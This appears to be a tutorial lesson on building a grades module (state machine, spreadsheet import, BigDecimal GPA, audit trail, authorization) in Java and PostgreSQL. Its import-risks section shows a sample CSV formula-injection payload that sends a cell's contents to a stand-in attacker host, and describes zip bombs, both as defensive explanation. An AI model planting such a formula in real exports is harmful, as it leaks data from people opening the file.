Grades: audit trails, locking, imports

Grades are the most sensitive data in Smart Campus. A wrong number can cost a student a scholarship. So grades follow strict steps (draft, published, locked), every change is recorded forever, spreadsheet uploads are checked row by row, and GPA is calculated with exact decimal numbers.

The Plan's table is grades(id, enrollment_id FK UNIQUE, midterm, final, total, letter, published, published_at). 2. A state machine for grades

The Plan has a published boolean. Together with locking (GR-7) we really have three states. A state machine lists the states and the only allowed moves between them. Think of a parcel: "packed → shipped → delivered". It can never go from "delivered" back to "packed".

Grades are published per section, so the aggregate is a grade sheet: one per section, with one entry per enrolled student.

             publish (lecturer, GR-2)          lock (admin or deadline job, GR-7)
   DRAFT ─────────────────────────────► PUBLISHED ─────────────────────────────► LOCKED
   │  ▲                                    │  ▲
   │  │ edit scores freely                 │  │ change a score only through an
   └──┘ (students see nothing)             └──┘ accepted review (GR-6), audited

   Not allowed: PUBLISHED → DRAFT, LOCKED → anything, DRAFT → LOCKED
enum SheetStatus {
    DRAFT, PUBLISHED, LOCKED;

    boolean canMoveTo(SheetStatus next) {
        return switch (this) {
            case DRAFT -> next == PUBLISHED;
            case PUBLISHED -> next == LOCKED;
            case LOCKED -> false;
        };
    }
}
List<GradePublished> publish(UUID actorId, Instant now) {
    moveTo(SheetStatus.PUBLISHED);
    if (entries.stream().anyMatch(e -> e.total() == null)) {
        throw new CampusProblem(ProblemCode.VALIDATION_FAILED, "Every student needs a total before publishing");
    }
    this.publishedAt = now;
    return entries.stream().map(e -> new GradePublished(e.studentId(), sectionId, now)).toList();
}

private void moveTo(SheetStatus next) {
    if (!status.canMoveTo(next)) {
        throw new CampusProblem(ProblemCode.CONFLICT,
                "Grades for this section are %s and cannot become %s".formatted(status, next));
    }
    this.status = next;
}

Why throw on an illegal move instead of quietly ignoring it? A silent "no" hides bugs. If some code tries to unpublish grades, we want a loud error (409 problem JSON) and a log line, not a grade sheet that is secretly in a different state than the caller thinks. The switch on an enum also forces you to handle every state: add a fourth state and the compiler reminds you to decide its moves.

3. Entry by form and by spreadsheet (GR-1)

The form is simple: one row per student on the roster, the lecturer types the scores, the browser sends them, and the aggregate checks each value (for example 0 ≤ score ≤ 10, at most 2 decimals) while the sheet is in DRAFT.

For a class of 200, lecturers prefer a spreadsheet. The import must be strict and helpful at the same time:

  1. Parse everything first. Read all rows into simple records. Do not save anything yet.
  2. Validate every row and collect all errors, not only the first: unknown student code (not on the roster), score out of range, too many decimals, the same student twice, missing columns.
  3. All or nothing. If there is any error, save nothing and return the full list. If there are none, save all rows in one transaction. Half an import is the worst result: nobody knows which rows went in.
  4. Preview. A "dry run" mode returns what would change ("12 new scores, 3 changed, 0 errors") so the lecturer can confirm.

Row numbers must match what the lecturer sees in Excel (count the header row!), or the error list is useless.

CSV or Excel?

  • CSV is plain text. Watch the encoding: Excel often saves CSV with a byte-order mark (BOM) or in a Windows code page, and Vietnamese names break. Accept UTF-8 (with or without BOM) and say so in the template.
  • Excel (.xlsx) needs a parser library such as Apache POI. That is a new dependency, and the platform spec says to ask first. Offer a downloadable template with the roster already filled in, so lecturers only add scores.

4. Import risks: zip bombs and formula injection

An uploaded file is untrusted input, even from a lecturer: their computer may be infected, or the file may come from somewhere else.

Zip bombs

An .xlsx file is really a ZIP archive of XML files. A zip bomb is a tiny file (a few KB) that expands to gigabytes when unpacked, and fills the server's memory. Defences:

  • Limit the upload size (a grade sheet is small; something like 2 MB is plenty) in Spring's multipart settings and at the gateway.
  • Limit the number of rows (no section has 100,000 students).
  • Use the parser's own protections. Apache POI, for example, refuses entries that compress "too well" (ZipSecureFile and its minimum inflate ratio). Do not turn these off.
  • Check the file type by its content, not only by the file name.

CSV formula injection

If a cell starts with =, +, - or @, spreadsheet programs treat it as a formula. Imagine a student whose "name" in some system is =HYPERLINK("http://evil.example/?"&A1,"click"). When the lecturer later exports grades to CSV and opens it in Excel, the formula runs on the lecturer's computer.

  • On import: scores are numbers, so reject anything that is not a plain number. Text columns we only use for matching (student code) must match the roster exactly.
  • On export: if a text cell starts with =, +, -, @, a tab or a carriage return, put a single quote ' in front so Excel shows it as text.

More on uploads in lesson 28 and lesson 30.

5. GPA with BigDecimal (GR-3)

Never use double for grades or money. double stores binary fractions, so 0.1 + 0.2 is 0.30000000000000004. A GPA of 2.4999999 rounded down to 2.49 instead of 2.50 can decide a scholarship. BigDecimal stores exact decimal numbers, like the shared-kernel's Money does.

Example scale (for teaching only)

Many Vietnamese universities using credits convert the 10-point score to a letter and a 4-point value like this. This is an example. Your university's real table, rounding steps and retake rules must be fixed in SPEC-grade.md.

10-point scoreLetter4-point value
8.5 – 10.0A4.0
8.0 – 8.4B+3.5
7.0 – 7.9B3.0
6.5 – 6.9C+2.5
5.5 – 6.4C2.0
5.0 – 5.4D+1.5
4.0 – 4.9D1.0
below 4.0F0.0

The calculation

GPA is a weighted average: each course counts as many times as it has credits. A 4-credit course matters twice as much as a 2-credit course.

GPA = Σ (4-point value × credits) ÷ Σ credits

CS101  8.7 → A  4.0 × 3 credits = 12.0
MA101  7.2 → B  3.0 × 4 credits = 12.0
EN101  6.0 → C  2.0 × 2 credits =  4.0
                          sum     28.0 ÷ 9 credits = 3.111… → 3.11
record CourseResult(BigDecimal total10, int credits) { }

final class GpaCalculator {
    private final GradeScale scale;                       // the table above, from config/spec

    GpaCalculator(GradeScale scale) {
        this.scale = scale;
    }

    Optional<BigDecimal> gpa(List<CourseResult> results) {
        BigDecimal points = BigDecimal.ZERO;
        int credits = 0;
        for (CourseResult r : results) {
            BigDecimal point4 = scale.toPoint4(r.total10().setScale(1, RoundingMode.HALF_UP)); // rule: round total first
            points = points.add(point4.multiply(BigDecimal.valueOf(r.credits())));
            credits += r.credits();
        }
        if (credits == 0) {
            return Optional.empty();                      // no GPA yet, not "0.00"
        }
        return Optional.of(points.divide(BigDecimal.valueOf(credits), 2, RoundingMode.HALF_UP));
    }
}
  • Create from strings: new BigDecimal("8.45"), never new BigDecimal(8.45) (that copies the binary error in).
  • Always give a scale and a RoundingMode to divide. Without them, 28 ÷ 9 throws ArithmeticException, because the exact answer never ends.
  • Round on purpose, at fixed steps: the total to 1 decimal before the letter, the GPA to 2 decimals at the end. Write each step in the spec.
  • Compare with compareTo, not equals: new BigDecimal("8.5").equals(new BigDecimal("8.50")) is false.
  • Store scores as NUMERIC(4,2) in PostgreSQL, which is exact too.

6. Review requests (GR-5, GR-6)

A student thinks the final exam was marked wrong. They open a review request; the lecturer accepts (and corrects the score) or rejects it with a reason.

CREATE TABLE grade.review_requests (
    id              UUID PRIMARY KEY,
    grade_sheet_id  UUID NOT NULL REFERENCES grade.grade_sheets (id),   -- same schema
    student_id      UUID NOT NULL,
    reason          TEXT NOT NULL,
    status          TEXT NOT NULL,          -- OPEN / ACCEPTED / REJECTED
    decided_by      UUID,
    decision_note   TEXT,
    created_at      TIMESTAMPTZ NOT NULL,
    decided_at      TIMESTAMPTZ,
    version         BIGINT NOT NULL DEFAULT 0
);
-- At most one open request per student per sheet
CREATE UNIQUE INDEX one_open_review
    ON grade.review_requests (grade_sheet_id, student_id) WHERE status = 'OPEN';

Rules to put in the model (proposed): a request is only possible while the sheet is PUBLISHED and before the review deadline; only the student themself can open it; only the section's lecturer can decide; accepting it is the only way to change a published score, and the change is audited with the review id as the reason. Review requests have their own small state machine (OPEN → ACCEPTED or OPEN → REJECTED).

7. An append-only audit trail (NFR-3, GR-7)

An audit trail answers "who changed what, when, from what, to what, and why". It is append-only: rows are only ever added, never changed or deleted, like the pages of a bound notebook.

CREATE TABLE grade.grade_audit (
    id              UUID PRIMARY KEY,
    grade_sheet_id  UUID NOT NULL,
    student_id      UUID NOT NULL,
    field           TEXT NOT NULL,          -- midterm / final / total / status
    old_value       TEXT,
    new_value       TEXT,
    actor_id        UUID NOT NULL,          -- who (from the JWT)
    reason          TEXT,                   -- "import file x.xlsx", "review 7f3…"
    trace_id        TEXT,                   -- link to logs and traces (lesson 12)
    occurred_at     TIMESTAMPTZ NOT NULL    -- from Clock
);

App-level vs database trigger

Written by the application

The aggregate records each change; the service inserts audit rows in the same transaction as the change (both saved or neither). It knows the actor, the reason and the trace id. Easy to test with unit tests.

Weak point: a developer who writes SQL that skips the aggregate skips the audit.

Written by a PostgreSQL trigger

A trigger on grade.grade_entries writes old and new values on every UPDATE, whatever code ran it. Nothing can forget it.

Weak point: the database does not know "who" or "why". The app must pass them, for example with SET LOCAL campus.actor_id = '…' in the transaction, which the trigger reads with current_setting('campus.actor_id', true).

A good combination: write audit rows from the application (rich context), and add a small trigger that forbids UPDATE and DELETE on the audit table, so it really is append-only:

CREATE FUNCTION grade.audit_is_append_only() RETURNS trigger
LANGUAGE plpgsql AS $$
BEGIN
    RAISE EXCEPTION 'grade_audit is append-only';
END;
$$;

CREATE TRIGGER no_update_or_delete
    BEFORE UPDATE OR DELETE ON grade.grade_audit
    FOR EACH ROW EXECUTE FUNCTION grade.audit_is_append_only();

Be honest about the limit: the table owner (core_app) could drop the trigger. This stops accidents and bugs, not a person with owner rights. Stronger protection (a separate audit store, write-once storage) is a production topic.

Locking (GR-7) works with the audit: once a sheet is LOCKED, the aggregate refuses every change. If the university wants a formal correction process after locking (an academic admin with a mandatory reason), the spec must add it as an explicit, audited action, not a "just unlock it" button.

8. Events, notifications and who may do what

GradePublished on grade.events

When a sheet is published, grade publishes one GradePublished per student through the outbox. The topic grade.events is keyed by studentId (Topics.GRADE_EVENTS, spec D6), so one student's grade events stay in order.

public record GradePublished(
        StudentId studentId,     // the Kafka key for grade.events
        SectionId sectionId,
        Instant publishedAt) { } // no score: see below

Why no score in the event? Event topics keep all history forever (retention.ms=-1, spec D5). A score in an event is a copy of private data that can never be deleted from Kafka. The consumer that needs it (notification) only says "your CS101 grade is published"; the student opens the app to see the number.

Notify on publish (GR-4)

notification is a "sink" (capability map): it consumes GradePublished and sends an in-app message, push or email. The capability map's rule is that each publisher's spec includes the notification handler for its own events, so the grade spec owns this handler. See lesson 24.

Authorization: only the section's lecturer

Having the LECTURER role is not enough: a lecturer may grade only their own sections (Arch §8: "a lecturer grades only their sections"). That is a row-level ownership check. grade learns who teaches a section from SectionChanged.lecturerId (a local projection, lesson 22).

@PreAuthorize("hasRole('LECTURER')")                       // 1. the role (lesson 17)
@PostMapping("/api/v1/grade/sections/{sectionId}/publication")
ResponseEntity<Void> publish(@PathVariable UUID sectionId, @AuthenticationPrincipal Jwt jwt) {
    UUID me = currentUsers.idOf(jwt);
    if (!sectionLecturers.isLecturerOf(me, new SectionId(sectionId))) {  // 2. the ownership
        throw new CampusProblem(ProblemCode.NOT_FOUND, "Section %s not found".formatted(sectionId));
    }
    gradeSheets.publish(new SectionId(sectionId), me);
    return ResponseEntity.noContent().build();
}
  • Answering 404 instead of 403 for someone else's section avoids telling strangers which sections exist. The spec chooses one and uses it everywhere.
  • Students read only their own grades: the student id comes from the token, never from a request parameter.
  • Locking (GR-7) is for ACADEMIC_ADMIN (role list from C3), plus a scheduled job at the deadline.

10. Common mistakes

  • A published boolean plus a locked boolean. Four combinations, one of them nonsense (locked but not published). Use one status field.
  • Saving the valid rows of an import and skipping the bad ones. All or nothing.
  • Stopping at the first error. The lecturer fixes one row, uploads again, finds the next. Report all errors at once.
  • double for scores, or divide without a rounding mode.
  • Writing the audit row in a separate transaction, or after the commit. A crash leaves a change without a trace.
  • Checking only the role, so any lecturer can grade any section.
  • Putting scores in events on a topic that keeps data forever.
  • Hard-coding the grade scale without a spec. Rules differ between universities and change over time.

13. Test yourself

1. Why should an illegal move like PUBLISHED → DRAFT throw an exception instead of being ignored?

Ignoring it hides a bug: the caller believes the change happened. A clear error (409) is logged and shown, so the problem is found and fixed. Grades must never be in a surprising state.

2. Why must a spreadsheet import be all-or-nothing?

With partial saves, nobody knows which scores are in the system. Fixing the file and uploading again could create duplicates or mix old and new values. One transaction keeps the sheet in a known state.

3. Why does divide need a scale and a rounding mode?

Some divisions, like 28 ÷ 9, have no exact decimal result. Without telling BigDecimal how many decimals to keep and how to round, it throws an ArithmeticException. Choosing it explicitly also makes the rounding rule visible and testable.

4. Why is the audit row written in the same transaction as the grade change?

Then both are saved or neither is. A separate transaction could save the change but lose the audit row in a crash, which breaks NFR-3 ("every change can be traced").

5. Why is hasRole('LECTURER') not enough to publish grades?

It only proves the user is a lecturer. Without an ownership check, any lecturer could publish or change grades of any section. The check "this user teaches this section" is required too.

6. Why does GradePublished not include the score?

Event topics keep their history forever. A score in an event would be private data that can never be removed from Kafka, and no consumer needs it: the notification only says the grade is available.
